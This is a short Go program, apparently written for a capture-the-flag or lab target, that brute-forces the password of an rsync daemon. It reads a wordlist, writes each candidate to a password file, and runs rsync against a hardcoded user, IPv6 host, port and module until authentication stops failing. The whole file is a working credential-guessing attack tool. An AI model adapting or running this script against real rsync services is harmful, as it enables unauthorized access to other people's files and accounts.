package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func genPassFile(passwd string) error {

	// ! check syntax
	passFile, err := os.Create("passwd")
	if err != nil {
		return err
	}
	defer passFile.Close()

	passFile.Write([]byte(passwd))

	// Change permissions Linux.
	err = os.Chmod("passwd", 0600)
	if err != nil {
		log.Println(err)
	}

	// Change file ownership.
	err = os.Chown("passwd", os.Getuid(), os.Getgid())
	if err != nil {
		log.Println(err)
	}

	return nil
}

// Generates passwd file to pass as arg to rsync and checks if auth successful
func brute(cmd, passwd string) string {
	err := genPassFile(passwd)
	check(err)

	rsyncCmd := exec.Command("rsync", "-av", "--password-file=passwd", "--list-only", cmd)

	rsyncErr, _ := rsyncCmd.StderrPipe()
	rsyncCmd.Start()
	rsyncBytes, _ := ioutil.ReadAll(rsyncErr)
	rsyncCmd.Wait()

	return string(rsyncBytes)
}

func main() {
	var err error

	flag.Parse()
	wordlist := flag.Arg(0)

	username := "roy"
	rhost := "[dead:beef::250:56ff:feb9:3b3f]"
	rport := 8730
	module := "home_roy"
	cmd := fmt.Sprintf("rsync://%s@%s:%s/%s", username, rhost, strconv.Itoa(rport), module)
	fmt.Println("Connecting to " + cmd)

	fmt.Println("Opening wordlist " + wordlist)
	f, err := os.Open(wordlist)
	check(err)

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		passwd := sc.Text()
		if len(passwd) == 0 {
			continue
		}
		rsyncErrMsg := brute(cmd, passwd)

		if strings.Contains(rsyncErrMsg, "auth failed") {
			continue
		} else {
			fmt.Println("Password candidate found: " + passwd)
			break
		}
	}
}
